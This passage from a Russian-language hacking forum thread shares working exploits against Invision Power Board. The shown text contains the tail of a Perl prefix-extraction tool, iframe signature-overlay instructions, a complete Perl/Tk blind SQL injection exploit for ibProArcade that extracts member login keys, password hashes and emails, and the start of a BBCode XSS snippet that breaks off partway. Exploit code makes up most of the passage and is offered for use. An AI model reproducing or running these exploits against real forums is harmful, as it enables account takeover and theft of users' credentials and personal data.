/>$InfoWindow-&gt;destroy;<br />&#125;<br /><br />&nbsp;<br />sub get_prefix&#40;&#41;<br />&#123;<br />$InfoWindow=$mw-&gt;DialogBox&#40;-title&nbsp; &nbsp;=&gt; 'get database tables prefix', -buttons =&gt; &#91;&quot;OK&quot;&#93;&#41;;<br />$InfoWindow-&gt;add&#40;'Label', -text =&gt; '', -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack;<br />$InfoWindow-&gt;add&#40;'Label', -text =&gt; $url, -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack;<br />$InfoWindow-&gt;add&#40;'Label', -text =&gt; '', -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack;<br />$xpl = LWP::UserAgent-&gt;new&#40; &#41; or die;<br />$res = $xpl-&gt;get&#40;$url.&quot;?automodule=gallery&amp;cmd=rate&amp;img=1&amp;rating=1&amp;album=-1\\&quot;&#41;;<br />if&#40;$res-&gt;is_success&#41;<br />&nbsp;&#123;<br />&nbsp;$rep = '';<br />&nbsp;if&#40;$res-&gt;as_string =~ /FROM &#40;.*&#41;gallery_albums/&#41;<br />&nbsp;&#123;<br />&nbsp;$prefix = $1;<br />&nbsp;$InfoWindow-&gt;add&#40;'Label', -text =&gt; 'Prefix: '.$prefix, -font =&gt; '&#123;Verdana&#125; 8 bold'&#41;-&gt;pack;<br />&nbsp;&#125;<br />&nbsp;else<br />&nbsp;&#123;<br />&nbsp;$InfoWindow-&gt;add&#40;'Label', -text =&gt; 'Can\'t get prefix', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'red'&#41;-&gt;pack; &#125;<br />&nbsp;&#125;<br />else<br />&nbsp;&#123;<br />&nbsp;$InfoWindow-&gt;add&#40;'Label', -text =&gt; 'Error!', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'red'&#41;-&gt;pack;<br />&nbsp;$InfoWindow-&gt;add&#40;'Label', -text =&gt; $res-&gt;status_line, -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack;<br />&nbsp;&#125;<br />$InfoWindow-&gt;Show&#40;&#41;;<br />$InfoWindow-&gt;destroy;&nbsp; <br />&#125;<br /><br /></code></dd></dl></div>
</div>
<dl class="postprofile" id="profile51123"><dt><span style="font-size: 1.1em;"><a href="./memberlist.php?mode=viewprofile&amp;u=895&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" style="color: #0000a0;" class="username-coloured">divir</a></span></dt><dd>unknown_user</dd><dd><img src="./images/ranks/r15.gif" alt="unknown_user" title="unknown_user" /></dd><dd><strong>Откуда:</strong> 127.0.0.1</dd><dd><strong>Сообщения:</strong> 691</dd>
</dl>
<div class="back2top"><a href="#wrap" class="top" title="Вернуться к началу">Вернуться к началу</a></div>
<span class="corners-bottom"><span></span></span></div></div>
<hr class="divider" /><div id="p53767" class="post bg1"><div class="inner"><span class="corners-top"><span></span></span>
<div class="postbody"><p class="author"><a href="./viewtopic.php?p=53767&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a#p53767"><img src="./styles/prosilver/imageset/icon_post_target.gif" width="11" height="9" alt="Сообщение" title="Сообщение" /></a> <strong><a href="./memberlist.php?mode=viewprofile&amp;u=2&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" style="color: #ff8000;" class="username-coloured">Lenar</a></strong> &raquo; 26 апр 2008 14:20 </p>

<div class="content"><span style="font-weight: bold">Invision Power Board &lt;=2.3.x iFrame Vulnerability</span>
<br />1)Регистрируемся
<br />2)Заходим в свой профиль
<br />3)Изменяем подпись(html включен):
<br /><dl class="codebox"><dt>Код: <a href="#" onclick="selectCode(this); return false;">Выделить всё</a></dt><dd><code>&lt;head&gt; <br />&lt;title&gt;Заголовок&lt;/title&gt; <br />&lt;/head&gt; <br />&lt;body&gt; <br />&lt;div id=&quot;iFrame1&quot; style=&quot;position:absolute; left:0px; top:0px; z-index:0&quot;&gt; <br />&lt;iframe name=&quot;iFrame1&quot; width=1024 height=3186 src=&quot;http://адрес Вашей страницы.html&quot; scrolling=&quot;no&quot; <br />frameborder=&quot;0&quot;&gt;&lt;/iframe&gt; <br />&lt;/div&gt; <br />&lt;/body&gt; <br />&lt;/html&gt;</code></dd></dl>4)Постим сообщение- страница форума перекрывается Вашей страницей.<br /><br /><span style="color: green"><span style="font-size: 75%; line-height: 116%;">Добавлено спустя 9 минут 3 секунды:</span></span><br /><br /><span style="font-weight: bold"> ibProArcade &lt;= v3.3.0 sql injection exploit</span><br /><dl class="codebox"><dt>Код: <a href="#" onclick="selectCode(this); return false;">Выделить всё</a></dt><dd><code>&nbsp;#!/usr/bin/perl <br /><br />## ibProArcade &lt;= v3.3.0 sql injection exploit <br />## &#40;c&#41;oded by 1dt.w0lf <br />## RST/GHC <br /><br />##&nbsp; &nbsp; &nbsp; &nbsp; THIS IS UNPUBLISHED RST/GHC EXPLOIT CODE <br />##&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;KEEP IT PRIVATE <br /><br />use Tk; <br />use Tk::BrowseEntry; <br />use Tk::DialogBox; <br />use LWP::UserAgent; <br /><br />BEGIN &#123; <br />if&#40;$^O eq 'MSWin32'&#41;&#123; <br />require Win32::Console; <br />Win32::Console::Free&#40;&#41;; <br />&#125; <br />&#125; <br /><br />$mw = new MainWindow&#40;title =&gt; &quot;r57ibProArcade&quot; &#41;; <br /><br />$mw-&gt;geometry &#40; '420x310' &#41; ; <br />$mw-&gt;resizable&#40;0,0&#41;; <br /><br />$mw-&gt;Label&#40;-text =&gt; '!', -font =&gt; '&#123;Webdings&#125; 22'&#41;-&gt;pack&#40;&#41;; <br />$mw-&gt;Label&#40;-text =&gt; 'ibProArcade sql injection exploit by RST/GHC', -font =&gt; '&#123;Verdana&#125; 7 bold',-foreground=&gt;'red'&#41;-&gt;pack&#40;&#41;; <br />$mw-&gt;Label&#40;-text =&gt; ''&#41;-&gt;pack&#40;&#41;; <br /><br />$fleft=$mw-&gt;Frame&#40;&#41;-&gt;pack &#40; -side =&gt; 'left', -anchor =&gt; 'ne'&#41; ; <br />$fright=$mw-&gt;Frame&#40;&#41;-&gt;pack &#40; -side =&gt; 'left', -anchor =&gt; 'nw'&#41; ; <br /><br />$url = 'http://127.0.0.1/ipb216/index.php'; <br />$user_id = '1'; <br />$prefix = 'ibf_'; <br />$column = 'member_login_key'; <br />$report = ''; <br />$true = 0; <br />$false = 0; <br /><br />$fleft-&gt;Label &#40; -text =&gt; 'Path to forum index: ', -font =&gt; '&#123;Verdana&#125; 8 bold'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ; <br />$fright-&gt;Entry &#40; -relief =&gt; &quot;groove&quot;, -width =&gt; 35, -font =&gt; '&#123;Verdana&#125; 8', -textvariable =&gt; $url&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'w' &#41; ; <br /><br />$fleft-&gt;Label &#40; -text =&gt; 'User ID: ', -font =&gt; '&#123;Verdana&#125; 8 bold' &#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ; <br />$fright-&gt;Entry &#40; -relief =&gt; &quot;groove&quot;, -width =&gt; 35, -font =&gt; '&#123;Verdana&#125; 8', -textvariable =&gt; $user_id&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'w' &#41; ; <br /><br />$fleft-&gt;Label &#40; -text =&gt; 'Database tables prefix: ', -font =&gt; '&#123;Verdana&#125; 8 bold'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ; <br />$fright-&gt;Entry &#40; -relief =&gt; &quot;groove&quot;, -width =&gt; 35, -font =&gt; '&#123;Verdana&#125; 8', -textvariable =&gt; $prefix&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'w' &#41; ; <br /><br />$fright-&gt;Label&#40; -text =&gt; ' '&#41;-&gt;pack&#40;&#41;; <br />$fleft-&gt;Label&#40; -text =&gt; ' '&#41;-&gt;pack&#40;&#41;; <br /><br />$fleft-&gt;Label &#40; -text =&gt; 'get data from database', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'green'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ; <br />$fright-&gt;Label&#40; -text =&gt; ' '&#41;-&gt;pack&#40;&#41;; <br /><br />$fleft-&gt;Label &#40; -text =&gt; 'Get data from column: ', -font =&gt; '&#123;Verdana&#125; 8 bold'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ; <br />$b = $fright-&gt;BrowseEntry&#40; -relief =&gt; &quot;groove&quot;, -variable =&gt; $column, -font =&gt; '&#123;Verdana&#125; 8'&#41;; <br />$b-&gt;insert&#40;&quot;end&quot;, &quot;member_login_key&quot;&#41;; <br />$b-&gt;insert&#40;&quot;end&quot;, &quot;name&quot;&#41;; <br />$b-&gt;insert&#40;&quot;end&quot;, &quot;ip_address&quot;&#41;; <br />$b-&gt;insert&#40;&quot;end&quot;, &quot;legacy_password&quot;&#41;; <br />$b-&gt;insert&#40;&quot;end&quot;, &quot;email&quot;&#41;; <br />$b-&gt;pack&#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'w' &#41;; <br /><br />$fleft-&gt;Label &#40; -text =&gt; 'Returned data: ', -font =&gt; '&#123;Verdana&#125; 8 bold'&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'e' &#41; ; <br />$fright-&gt;Entry &#40; -relief =&gt; &quot;groove&quot;, -width =&gt; 35, -font =&gt; '&#123;Verdana&#125; 8', -textvariable =&gt; $report&#41; -&gt;pack &#40; -side =&gt; &quot;top&quot; , -anchor =&gt; 'w' &#41; ; <br /><br /><br />$fright-&gt;Label&#40; -text =&gt; ' '&#41;-&gt;pack&#40;&#41;; <br /><br />$fright-&gt;Button&#40;-text&nbsp; &nbsp; =&gt; 'Test forum vulnerability', <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -relief =&gt; &quot;groove&quot;, <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -width =&gt; '30', <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -font =&gt; '&#123;Verdana&#125; 8 bold', <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -activeforeground =&gt; 'red', <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -command =&gt; &amp;test_vuln <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#41;-&gt;pack&#40;&#41;; <br /><br />$fright-&gt;Button&#40;-text&nbsp; &nbsp; =&gt; 'Get database tables prefix', <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -relief =&gt; &quot;groove&quot;, <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -width =&gt; '30', <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -font =&gt; '&#123;Verdana&#125; 8 bold', <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -activeforeground =&gt; 'red', <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -command =&gt; &amp;get_prefix <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#41;-&gt;pack&#40;&#41;; <br /><br />$fright-&gt;Button&#40;-text&nbsp; &nbsp; =&gt; 'Get data from database', <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -relief =&gt; &quot;groove&quot;, <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -width =&gt; '30', <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -font =&gt; '&#123;Verdana&#125; 8 bold', <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -activeforeground =&gt; 'red', <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -command =&gt; &amp;get_data <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&#41;-&gt;pack&#40;&#41;; <br /><br /><br /><br />$fleft-&gt;Label&#40; -text =&gt; ' '&#41;-&gt;pack&#40;&#41;; <br />$fleft-&gt;Label&#40; -text =&gt; '+++ PRIV8 +++', -font =&gt; '&#123;Verdana&#125; 7'&#41;-&gt;pack&#40;&#41;; <br />$fleft-&gt;Label&#40; -text =&gt; '&#40;c&#41;oded by 1dt.w0lf', -font =&gt; '&#123;Verdana&#125; 7'&#41;-&gt;pack&#40;&#41;; <br />$fleft-&gt;Label&#40; -text =&gt; 'RST/GHC', -font =&gt; '&#123;Verdana&#125; 7'&#41;-&gt;pack&#40;&#41;; <br /><br />MainLoop&#40;&#41;; <br /><br />sub get_data&#40;&#41; <br />&#123; <br />$true = &amp;get_true&#40;&#41;; <br /><br />$report = '';&nbsp; &nbsp;<br />$s_num=1; <br />while&#40;&#40;$chr = &amp;found&#40;0,255&#41;&#41;!=0&#41;&#123; <br />$report .= chr&#40;$chr&#41;; <br />$mw-&gt;update&#40;&#41;; <br />$s_num++; <br />&#125; <br />if&#40;length&#40;$report&#41; &gt; 0&#41; &#123; &amp;report&#40;'That\'s all ;&#41;'&#41;; &#125; <br />else &#123; &amp;report&#40;'Can\'t get data from database'&#41;; &#125; <br /><br />&#125; <br /><br />sub test_vuln&#40;&#41; <br />&#123; <br />$InfoWindow=$mw-&gt;DialogBox&#40;-title&nbsp; &nbsp;=&gt; 'test forum vulnerability', -buttons =&gt; &#91;&quot;OK&quot;&#93;&#41;; <br />$InfoWindow-&gt;add&#40;'Label', -text =&gt; '', -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack; <br />$InfoWindow-&gt;add&#40;'Label', -text =&gt; $url, -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack; <br />$InfoWindow-&gt;add&#40;'Label', -text =&gt; '', -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack; <br /><br />$true = &amp;get_true&#40;&#41;; <br />$false = &amp;get_false&#40;&#41;; <br /><br />if&#40;$true != $false&#41; &#123; $InfoWindow-&gt;add&#40;'Label', -text =&gt; 'FORUM VULNERABLE', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'red'&#41;-&gt;pack; &#125; <br />else &#123; $InfoWindow-&gt;add&#40;'Label', -text =&gt; 'FORUM UNVULNERABLE', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'green'&#41;-&gt;pack; &#125; <br /><br />$InfoWindow-&gt;Show&#40;&#41;; <br />$InfoWindow-&gt;destroy; <br />&#125; <br /><br />sub get_true&#40;&#41; <br />&#123; <br />$xpl = LWP::UserAgent-&gt;new&#40; &#41; or die; <br />$res = $xpl-&gt;get&#40;$url.&quot;?autocom=arcade&amp;overwrite_sort=added&amp;overwrite_order=,&#40;-gid*&#40;1=1&#41;&#41;&quot;&#41;; <br />if&#40;$res-&gt;as_string =~ /g=&#40;d+&#41;&quot; target=&quot;hiddenframe&quot;&gt;&lt;img src=&quot;./arcade/images/addfav.gif&quot;/&#41; &#123; $rep = $1; &#125; <br />return $rep; <br />&#125; <br /><br />sub get_false&#40;&#41; <br />&#123; <br />$xpl = LWP::UserAgent-&gt;new&#40; &#41; or die; <br />$res = $xpl-&gt;get&#40;$url.&quot;?autocom=arcade&amp;overwrite_sort=added&amp;overwrite_order=,&#40;-gid*&#40;1=2&#41;&#41;&quot;&#41;; <br />if&#40;$res-&gt;as_string =~ /g=&#40;\d+&#41;&quot; target=&quot;hiddenframe&quot;&gt;&lt;img src=&quot;.\/arcade\/images\/addfav.gif&quot;/&#41; &#123; $rep = $1; &#125; <br />return $rep; <br />&#125; <br />&nbsp; <br />sub get_prefix&#40;&#41; <br />&#123; <br />$InfoWindow=$mw-&gt;DialogBox&#40;-title&nbsp; &nbsp;=&gt; 'get database tables prefix', -buttons =&gt; &#91;&quot;OK&quot;&#93;&#41;; <br />$InfoWindow-&gt;add&#40;'Label', -text =&gt; '', -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack; <br />$InfoWindow-&gt;add&#40;'Label', -text =&gt; $url, -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack; <br />$InfoWindow-&gt;add&#40;'Label', -text =&gt; '', -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack; <br />$xpl = LWP::UserAgent-&gt;new&#40; &#41; or die; <br />$res = $xpl-&gt;get&#40;$url.&quot;?autocom=arcade&amp;overwrite_sort=added&amp;overwrite_order=r57r0x&quot;&#41;; <br />if&#40;$res-&gt;is_success&#41; <br />&nbsp;&#123; <br />&nbsp;$rep = ''; <br />&nbsp;if&#40;$res-&gt;as_string =~ /from &#40;.*&#41;games_list/&#41; <br />&nbsp;&#123; <br />&nbsp;$prefix = $1; <br />&nbsp;$InfoWindow-&gt;add&#40;'Label', -text =&gt; 'Prefix: '.$prefix, -font =&gt; '&#123;Verdana&#125; 8 bold'&#41;-&gt;pack; <br />&nbsp;&#125; <br />&nbsp;else <br />&nbsp;&#123; <br />&nbsp;$InfoWindow-&gt;add&#40;'Label', -text =&gt; 'Can\'t get prefix', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'red'&#41;-&gt;pack; &#125; <br />&nbsp;&#125; <br />else <br />&nbsp;&#123; <br />&nbsp;$InfoWindow-&gt;add&#40;'Label', -text =&gt; 'Error!', -font =&gt; '&#123;Verdana&#125; 8 bold',-foreground=&gt;'red'&#41;-&gt;pack; <br />&nbsp;$InfoWindow-&gt;add&#40;'Label', -text =&gt; $res-&gt;status_line, -font =&gt; '&#123;Verdana&#125; 8'&#41;-&gt;pack; <br />&nbsp;&#125; <br />$InfoWindow-&gt;Show&#40;&#41;; <br />$InfoWindow-&gt;destroy;&nbsp; &nbsp;<br />&#125; <br /><br />sub found&#40;$$&#41; <br />&nbsp;&#123; <br />&nbsp;my $fmin = $_&#91;0&#93;; <br />&nbsp;my $fmax = $_&#91;1&#93;; <br />&nbsp;if &#40;&#40;$fmax-$fmin&#41;&lt;5&#41; &#123; $i=crack&#40;$fmin,$fmax&#41;; return $i; &#125; <br />&nbsp; <br />&nbsp;$r = int&#40;$fmax - &#40;$fmax-$fmin&#41;/2&#41;; <br />&nbsp;$check = &quot; BETWEEN $r AND $fmax&quot;; <br />&nbsp;if &#40; &amp;check&#40;$check&#41; &#41; &#123; &amp;found&#40;$r,$fmax&#41;; &#125; <br />&nbsp;else &#123; &amp;found&#40;$fmin,$r&#41;; &#125; <br />&nbsp;&#125; <br />&nbsp; <br />sub crack&#40;$$&#41; <br />&nbsp;&#123; <br />&nbsp;my $cmin = $_&#91;0&#93;; <br />&nbsp;my $cmax = $_&#91;1&#93;; <br />&nbsp;$i = $cmin; <br />&nbsp;while &#40;$i&lt;$cmax&#41; <br />&nbsp; &#123; <br />&nbsp; $crcheck = &quot;=$i&quot;; <br />&nbsp; if &#40; &amp;check&#40;$crcheck&#41; &#41; &#123; return $i; &#125; <br />&nbsp; $i++; <br />&nbsp; &#125; <br />&nbsp;$i = 0; <br />&nbsp;return $i; <br />&nbsp;&#125; <br />&nbsp; <br />sub check&#40;$&#41; <br />&nbsp;&#123; <br />&nbsp;$n++; <br />&nbsp;$rep = ''; <br />&nbsp;$ccheck = $_&#91;0&#93;; <br />&nbsp;$xpl = LWP::UserAgent-&gt;new&#40; &#41; or die; <br />&nbsp;$res = $xpl-&gt;get&#40;$url.'?autocom=arcade',cookie=&gt;'g_display_sort=added;g_display_order=,&#40;-gid*&#40;SELECT 1 FROM '.$prefix.'members WHERE &#40;id='.$user_id.' AND ascii&#40;substring&#40;'.$column.','.$s_num.',1&#41;&#41;'.$cchec&nbsp; k.'&#41; LIMIT 1&#41;&#41; LIMIT 1'&#41;; <br />&nbsp;if&#40;$res-&gt;as_string =~ /g=&#40;d+&#41;&quot; target=&quot;hiddenframe&quot;&gt;&lt;img src=&quot;./arcade/images/addfav.gif&quot;/&#41; &#123; $rep = $1; &#125; <br />&nbsp;if&#40;$rep == $true&#41; &#123; return 1; &#125; <br />&nbsp;else &#123; return 0; &#125; <br />&nbsp;&#125; <br />&nbsp; <br />sub report&#40;&#41; <br />&#123; <br />$InfoWindow=$mw-&gt;DialogBox&#40;-title&nbsp; &nbsp;=&gt; 'Report', -buttons =&gt; &#91;&quot;OK&quot;&#93;&#41;; <br />$InfoWindow-&gt;add&#40;'Label', -text =&gt; $_&#91;0&#93;, -font =&gt; '&#123;Verdana&#125; 7'&#41;-&gt;pack; <br />$InfoWindow-&gt;Show&#40;&#41;; <br />$InfoWindow-&gt;destroy; <br />&#125; </code></dd></dl><br /><span style="font-weight: bold">Invision Power Board &lt;=v2.3.4 BBCodes XSS</span><br /><dl class="codebox"><dt>Код: <a href="#" onclick="selectCode(this); return false;">Выделить всё</a></dt><dd><code>...................... <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $match&#91; $_content &#93;&#91;$i&#93; = preg_replace&#40; '#&#40;style&#41;=#is', &quot;$1=&quot;, $match&#91; $_content &#93;&#91;$i&#93; &#41;;&nbsp; &nbsp; &nbsp;<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $match&#91; $_option &#93;&#91;$i&#93; = preg_replace&#40; '#&#40;style&#41;=#is', &quot;$1=&quot;, $match&#91; $_option &#93;&#91;$i&#93; &#41;; <br />.......................&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br />&nbsp; &nbsp; &nbsp; &nbsp; //----------------------------------------- <br />&nbsp; &nbsp; &nbsp; &nbsp; // Don't let emos in URL.. <br />&nbsp; &nbsp; &nbsp; &nbsp; //----------------------------------------- <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br />&nbsp; &nbsp; &nbsp; &nbsp; if &#40; $this-&gt;parse_smilies &#41; <br />&nbsp; &nbsp; &nbsp; &nbsp; &#123; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if &#40; count&#40; $this-&gt;ipsclass-&gt;cache&#91;'emoticons'&#93; &#41; &gt; 0 &#41; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#123; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; foreach&#40; $this-&gt;ipsclass-&gt;cache&#91;'emoticons'&#93; as $row&#41; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#123; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $code&nbsp; &nbsp; = $row&#91;'typed'&#93;; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $code&nbsp; &nbsp; = str_replace&#40; '&lt;', '&amp;lt;', str_replace&#40; '&gt;', '&amp;gt;', $code &#41; &#41;;&nbsp; &nbsp; &nbsp;<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if&#40; strpos&#40; $url, $code &#41; &#41; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#123; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $new&nbsp; = ''; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; for&#40; $i=0; $i&lt;strlen&#40;$code&#41;; $i++ &#41; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#123; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; //print dechex&#40;ord&#40;$code&#123;$i&#125;&#41;&#41;.'&lt;Br&gt;'; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $new .= '%' . dechex&#40;ord&#40;$code&#123;$i&#125;&#41;&#41;; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#125; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $url = str_replace&#40; $code, $new, $url &#41;; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#125; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#125; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // Using the :/ smiley <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $url = str_replace&#40; 'http%3a%2f', 'http:/', $url &#41;; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#125; <br />&nbsp; &nbsp; &nbsp; &nbsp; &#125; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br />&nbsp; &nbsp; &nbsp; &nbsp; $url = htmlspecialchars&#40;$url&#41;; <br />.......................&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br />&nbsp; &nbsp; &nbsp; &nbsp; //----------------------------------------- <br />&nbsp; &nbsp; &nbsp; &nbsp; // Don't let emos in URL.. <br />&nbsp; &nbsp; &nbsp; &nbsp; //----------------------------------------- <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br />&nbsp; &nbsp; &nbsp; &nbsp; if &#40; $this-&gt;parse_smilies &#41; <br />&nbsp; &nbsp; &nbsp; &nbsp; &#123; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if &#40; count&#40; $this-&gt;ipsclass-&gt;cache&#91;'emoticons'&#93; &#41; &gt; 0 &#41; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#123; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; foreach&#40; $this-&gt;ipsclass-&gt;cache&#91;'emoticons'&#93; as $row&#41; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#123; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $code&nbsp; &nbsp; = $row&#91;'typed'&#93;; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $code&nbsp; &nbsp; = str_replace&#40; '&lt;', '&amp;lt;', str_replace&#40; '&gt;', '&amp;gt;', $code &#41; &#41;;&nbsp; &nbsp; &nbsp;<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if&#40; strpos&#40; $url&#91;'html'&#93;, $code &#41; &#41; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#123; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $new&nbsp; = ''; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; for&#40; $i=0; $i&lt;strlen&#40;$code&#41;; $i++ &#41; <br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &#123; <br 